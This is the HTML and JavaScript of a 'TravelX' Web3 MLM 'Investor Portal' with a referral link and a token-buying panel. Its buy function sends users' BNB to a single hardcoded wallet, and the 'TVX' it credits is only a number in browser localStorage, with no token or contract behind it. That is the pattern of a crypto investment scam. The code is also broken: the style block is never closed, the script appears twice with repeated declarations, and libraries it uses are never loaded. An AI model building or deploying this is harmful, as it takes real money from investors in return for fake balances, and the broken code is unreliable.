<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="TravelX - Professional Web3 MLM Platform">

<!-- FIXED LIBRARIES -->
<script src="https://cdn.tailwindcss.com"></script>

<style>
body { background-color:#060b14; scroll-behavior:smooth; }
.glass { background:rgba(13,19,32,0.95); border:1px solid rgba(255,255,255,0.05); }

<body class="text-white font-sans custom-scrollbar overflow-x-hidden">

<div class="min-h-screen flex flex-col lg:flex-row relative">

<!-- MOBILE TOP -->
<div class="lg:hidden flex justify-between items-center bg-[#0d1320] p-5 border-b border-white/10 sticky top-0 z-[100]">

<h1 class="text-2xl font-black text-emerald-400 italic">TRAVELX</h1>

<button onclick="toggleSidebar()"
class="p-2 bg-emerald-400/10 rounded-lg text-emerald-400">

<svg xmlns="http://www.w3.org/2000/svg"
class="h-6 w-6" fill="none"
viewBox="0 0 24 24" stroke="currentColor">

<path stroke-linecap="round"
stroke-linejoin="round"
stroke-width="2"
d="M4 6h16M4 12h16m-7 6h7"/>

</svg>

</button>
</div>

<!-- SIDEBAR -->
<aside id="sidebar"
class="sidebar-folded w-full lg:w-72 bg-[#0d1320] border-r border-white/10 p-6 fixed lg:sticky top-0 h-screen z-[99] flex flex-col">

<h1 class="text-3xl font-black text-emerald-400 mb-10 italic">TRAVELX</h1>

<nav class="space-y-3 flex-1 text-sm font-bold">

<a href="#" onclick="toggleSidebar()"
class="block px-4 py-3 rounded-2xl bg-emerald-400 text-black">Dashboard</a>

<a href="#buySection" onclick="toggleSidebar()"
class="block px-4 py-3 rounded-2xl bg-white/5 hover:bg-emerald-400/10">Buy & Swap</a>

<a href="#rewards" onclick="toggleSidebar()"
class="block px-4 py-3 rounded-2xl bg-white/5 hover:bg-emerald-400/10">VIP Rewards</a>

<a href="#reports" onclick="toggleSidebar()"
class="block px-4 py-3 rounded-2xl bg-white/5 hover:bg-emerald-400/10">Reports</a>

</nav>

<div class="mt-auto pt-6 border-t border-white/5 text-center">
<h4 class="text-[10px] text-emerald-400 uppercase font-bold">Rank Status</h4>
<p id="sideRank" class="text-xl font-black text-yellow-500 mt-1">NONE</p>
<button onclick="logout()" class="text-red-500 text-xs mt-4">Disconnect</button>
</div>

</aside>

<!-- MAIN -->
<main class="flex-1 p-4 lg:p-10 w-full overflow-x-hidden">

<!-- TOP BAR -->
<div class="grid xl:grid-cols-3 gap-6 mb-8">

<div>
<h2 class="text-3xl font-black italic">Investor Portal</h2>
<p class="text-gray-500 text-sm">Earn Rewards System</p>
</div>

<div class="glass p-4 rounded-2xl">
<p class="text-[10px] text-gray-400">Referral Link</p>
<input id="refLink" readonly
class="w-full mt-2 p-2 bg-black/40 text-emerald-400 text-xs rounded-xl">
<button onclick="copyRef()"
class="mt-2 bg-emerald-400 text-black px-3 py-1 rounded-xl text-xs">COPY</button>
</div>

<div class="flex gap-2 justify-end">
<button id="connectBtn" onclick="connect()"
class="bg-emerald-400 text-black px-5 py-2 rounded-xl">Connect</button>

<div id="walletDisplay"
class="hidden glass px-3 py-2 text-xs text-emerald-400"></div>
</div>

</div>

<!-- STATS -->
<div class="grid md:grid-cols-4 gap-4 mb-8">

<div class="glass p-4 rounded-xl">
<p class="text-xs text-gray-500">BNB</p>
<h3 id="bnbBal">0</h3>
</div>

<div class="glass p-4 rounded-xl">
<p class="text-xs text-gray-500">TVX</p>
<h3 id="tvxBal">0</h3>
</div>

<div class="glass p-4 rounded-xl">
<p class="text-xs text-yellow-500">Reward</p>
<h3 id="stakeProfit">0</h3>
</div>

<div class="glass p-4 rounded-xl">
<p class="text-xs text-blue-400">Income</p>
<h3 id="income">0</h3>
</div>

</div>

<!-- BUY -->
<div id="buySection" class="glass p-6 rounded-2xl mb-8">

<h3 class="text-emerald-400 font-bold mb-4">Buy TVX</h3>

<input id="bnbInput" type="number" min="0"
class="w-full p-3 bg-black/40 rounded-xl">

<button onclick="buy()"
class="mt-3 bg-yellow-500 text-black px-4 py-2 rounded-xl">
Buy
</button>

</div>

</main>

</div>

<script>

/* CONFIG */
const RECEIVER = "0x68211153222bf054Decb13920870523a0C4264d4";
const RATE = 10000;
const TVX_USD = 0.01;
let BNB_USD = 600;

let account, provider, signer;
let updateLoop;

/* DB */
const db = () => {
try {
return JSON.parse(localStorage.getItem("tvx_vFinal_PRO_V3")) || {};
} catch {
return {};
}
};

const save = d =>
localStorage.setItem("tvx_vFinal_PRO_V3", JSON.stringify(d));

/* TOGGLE */
function toggleSidebar(){
document.getElementById("sidebar").classList.toggle("sidebar-folded");
}

/* PRICE */
async function fetchPrice(){
try{
const r = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd");
const d = await r.json();
BNB_USD = d.binancecoin.usd || 600;
}catch{}
}

/* CONNECT */
async function connect(){
if(!window.ethereum) return Swal.fire("Error","MetaMask needed","error");

const accs = await ethereum.request({method:"eth_requestAccounts"});
if(!accs.length) return;

account = accs[0].toLowerCase();

provider = new ethers.providers.Web3Provider(window.ethereum);
signer = provider.getSigner();

update();
updateLoop = setInterval(update,5000);
}

/* UPDATE */
async function update(){
await fetchPrice();
const d = db();
const u = d[account] || {tvx:0,bnb:0,txHistory:[]};

document.getElementById("bnbBal").innerText = u.bnb;
document.getElementById("tvxBal").innerText = u.tvx;
document.getElementById("income").innerText = u.bnb;
}

/* BUY */
async function buy(){
const amt = document.getElementById("bnbInput").value;
if(!amt) return;

const tx = await signer.sendTransaction({
to: RECEIVER,
value: ethers.utils.parseEther(amt)
});

await tx.wait();

let d = db();
if(!d[account]) d[account] = {tvx:0,bnb:0,txHistory:[]};

d[account].tvx += amt * RATE;
save(d);

update();
Swal.fire("Success","Bought TVX","success");
}

/* COPY */
async function copyRef(){
const el = document.getElementById("refLink");
try{
await navigator.clipboard.writeText(el.value);
Swal.fire("Copied","","success");
}catch{}
}

/* LOGOUT */
function logout(){
localStorage.clear();
location.reload();
}
/* ================= CONFIG ================= */

const RECEIVER = "0x68211153222bf054Decb13920870523a0C4264d4";
const RATE = 10000;
const TVX_USD = 0.01;

let BNB_USD = 600;
let account, provider, signer;
let updateLoop;

/* ================= DATABASE ================= */

const db = () => {
    try {
        return JSON.parse(
            localStorage.getItem("tvx_vFinal_PRO_V3")
        ) || {};
    } catch {
        return {};
    }
};

const save = (d) =>
    localStorage.setItem(
        "tvx_vFinal_PRO_V3",
        JSON.stringify(d)
    );

/* ================= UI TOGGLE ================= */

function toggleSidebar() {
    document
        .getElementById("sidebar")
        ?.classList.toggle("sidebar-folded");
}

/* ================= PRICE ================= */

async function fetchPrice() {
    try {
        const res = await fetch(
            "https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd"
        );

        const data = await res.json();
        BNB_USD = data?.binancecoin?.usd || 600;

    } catch {
        BNB_USD = 600;
    }
}

/* ================= CONNECT WALLET ================= */

async function connect() {
    if (!window.ethereum)
        return Swal.fire("Error", "MetaMask not found", "error");

    try {
        const accs = await ethereum.request({
            method: "eth_requestAccounts"
        });

        if (!accs || !accs.length) return;

        account = accs[0].toLowerCase();

        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();

        let d = db();

        if (!d[account]) {
            d[account] = {
                tvx: 0,
                bnb: 0,
                txHistory: [],
                sponsor: null
            };
            save(d);
        }

        update();

        clearInterval(updateLoop);
        updateLoop = setInterval(update, 5000);

        Swal.fire("Success", "Wallet Connected", "success");

    } catch (e) {
        console.log(e);
        Swal.fire("Error", "Connection rejected", "error");
    }
}

/* ================= UPDATE DASHBOARD ================= */

async function update() {
    if (!account) return;

    await fetchPrice();

    let d = db();
    let u = d[account];

    if (!u) return;

    // BNB BALANCE
    try {
        const bal = await provider.getBalance(account);
        document.getElementById("bnbBal").innerText =
            parseFloat(ethers.utils.formatEther(bal)).toFixed(4);
    } catch {}

    // TVX BALANCE
    document.getElementById("tvxBal").innerText =
        u.tvx.toFixed(2);

    // INCOME
    document.getElementById("income").innerText =
        u.bnb.toFixed(4);

    // REF LINK
    let refEl = document.getElementById("refLink");
    if (refEl && account) {
        refEl.value =
            window.location.origin + "?ref=" + account;
    }
}

/* ================= BUY TVX ================= */

async function buy() {
    if (!account)
        return Swal.fire("Error", "Connect wallet first", "error");

    const amt = parseFloat(
        document.getElementById("bnbInput").value
    );

    if (!amt || amt <= 0)
        return Swal.fire("Error", "Invalid amount", "warning");

    try {
        const tx = await signer.sendTransaction({
            to: RECEIVER,
            value: ethers.utils.parseEther(amt.toString())
        });

        await tx.wait();

        let d = db();

        if (!d[account]) {
            d[account] = { tvx: 0, bnb: 0, txHistory: [] };
        }

        d[account].tvx += amt * RATE;

        d[account].txHistory.unshift({
            type: "BUY",
            amt: amt + " BNB"
        });

        save(d);

        update();

        Swal.fire("Success", "TVX Purchased", "success");

    } catch (e) {
        console.log(e);
        Swal.fire("Error", "Transaction failed", "error");
    }
}

/* ================= COPY REF ================= */

async function copyRef() {
    const el = document.getElementById("refLink");

    if (!el || !el.value) return;

    try {
        await navigator.clipboard.writeText(el.value);
        Swal.fire("Copied", "Referral link copied", "success");
    } catch {
        el.select();
        document.execCommand("copy");
    }
}

/* ================= LOGOUT ================= */

function logout() {
    localStorage.clear();
    location.reload();
}

/* ================= AUTO CONNECT ================= */

window.addEventListener("load", async () => {
    if (window.ethereum) {
        const accs = await ethereum.request({
            method: "eth_accounts"
        });

        if (accs.length > 0) {
            connect();
        }
    }
});
</script>

</body>
</html>
